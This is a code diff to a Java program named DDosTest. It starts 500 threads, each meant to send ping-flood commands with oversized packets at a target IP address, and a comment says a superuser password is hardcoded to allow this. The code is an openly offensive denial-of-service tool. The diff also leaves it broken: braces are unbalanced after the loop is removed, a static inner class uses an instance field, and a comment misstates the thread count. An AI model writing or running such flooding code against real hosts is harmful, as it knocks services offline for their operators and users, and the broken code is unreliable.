@@ -1,9 +1,21 @@
-import java.util.concurrent.atomic.AtomicBoolean;
 
 public class DDosTest {
 
+    private String ipAddress;
 
-    public static void main(String... args) {
+    public DDosTest(String ipAddress) {
+        this.ipAddress = ipAddress;
+    }
+
+    public String getIpAddress() {
+        return ipAddress;
+    }
+
+    public void setIpAddress(String ipAddress) {
+        this.ipAddress = ipAddress;
+    }
+
+    public void startThreads() {
         //Create and start 100 threads
         for (int i = 0; i < 500; i++) {
             DdosThread thread = new DdosThread();
@@ -13,13 +25,9 @@ public class DDosTest {
 
     public static class DdosThread extends Thread {
 
-        //Threadsafe boolean
-        private AtomicBoolean running = new AtomicBoolean(true);
-
         //Change run so that it may continue to ping infinitely until the boolean is set to false
         @Override
         public void run() {
-            while (running.get()) {
                 try {
                     /*Unix specific command prompt - requires superuser to specify the size of the packet being sent,
                     thus the system password is currently hardcoded
@@ -38,8 +46,6 @@ public class DDosTest {
                     //String[] cmd = {"ping " + ipAddress + " -f -t -l 65500"};
                     attack(cmd);
                 } catch (Exception e) {
-
-                }
             }
         }
 
